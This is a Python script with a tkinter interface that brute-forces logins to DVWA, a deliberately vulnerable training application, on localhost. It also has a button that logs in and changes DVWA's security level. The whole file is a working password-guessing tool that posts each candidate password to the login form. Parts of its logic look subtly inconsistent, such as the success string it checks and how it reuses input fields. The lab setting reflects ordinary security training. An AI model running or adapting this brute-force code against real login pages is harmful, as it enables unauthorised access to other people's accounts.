import requests
import tkinter as tk

# DVWA base URL (adjust as needed)
DVWA_LOGIN_URL = "http://localhost/dvwa/login.php"
DVWA_SECURITY_URL = "http://localhost/dvwa/security.php"

# Function to change security level
def change_security_level(security_level, username, password):
    # Prepare login data
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    print(login_data)
    # Send login request to obtain session cookies
    session = requests.Session()
    session.post(DVWA_LOGIN_URL, data=login_data)
    
    # Prepare data for the security level change request
    data = {
        'security': security_level,
        'seclev_submit': 'Submit'
    }

    # Send the request to change the security level directly to DVWA
    response = session.post(DVWA_SECURITY_URL, data=data)

    # Check if the security level change was successful
    if f"Security level is now {security_level.capitalize()}" in response.text:
        result_label.config(text=f"Security level changed to {security_level.capitalize()}")
    else:
        result_label.config(text="Failed to change security level")

# Function to perform brute force attack
def perform_brute_force(username, password_list):
    # Iterate through the password list
    for password in password_list:
        # Prepare login data
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }

        # Send login request
        response = requests.post(DVWA_LOGIN_URL, data=login_data)

        # Check if the login was successful
        if "Welcome to the password protected area" in response.text:
            result_label.config(text=f"Successful login! Password: {password}")
            return

    result_label.config(text="Brute force attack unsuccessful")

# TKinter GUI setup
root = tk.Tk()
root.title("Brute Force Attack without Burp Suite")

# Username entry
username_label = tk.Label(root, text="Username:")
username_label.grid(row=0, column=0, padx=10, pady=10)

username_entry = tk.Entry(root)
username_entry.grid(row=0, column=1, padx=10, pady=10)

# Password list entry
password_label = tk.Label(root, text="Password List (comma-separated):")
password_label.grid(row=1, column=0, padx=10, pady=10)

password_entry = tk.Entry(root)
password_entry.grid(row=1, column=1, padx=10, pady=10)

# Security level selection
security_label = tk.Label(root, text="Security Level:")
security_label.grid(row=2, column=0, padx=10, pady=10)

security_var = tk.StringVar(root)
security_var.set("low")  # Default selection

security_option = tk.OptionMenu(root, security_var, "low", "medium", "high", "impossible")
security_option.grid(row=2, column=1, padx=10, pady=10)

# Button to change security level
change_security_button = tk.Button(root, text="Change Security Level", command=lambda: change_security_level(security_var.get(), username_entry.get(), password_entry.get()))
change_security_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

# Button to trigger attack
attack_button = tk.Button(root, text="Perform Brute Force Attack", command=lambda: perform_brute_force(username_entry.get(), password_entry.get().split(",")))
attack_button.grid(row=4, column=0, columnspan=2, padx=10, pady=10)

# Label to display attack result
result_label = tk.Label(root, text="")
result_label.grid(row=5, column=0, columnspan=2, padx=10, pady=10)

# Start the TKinter event loop
root.mainloop()
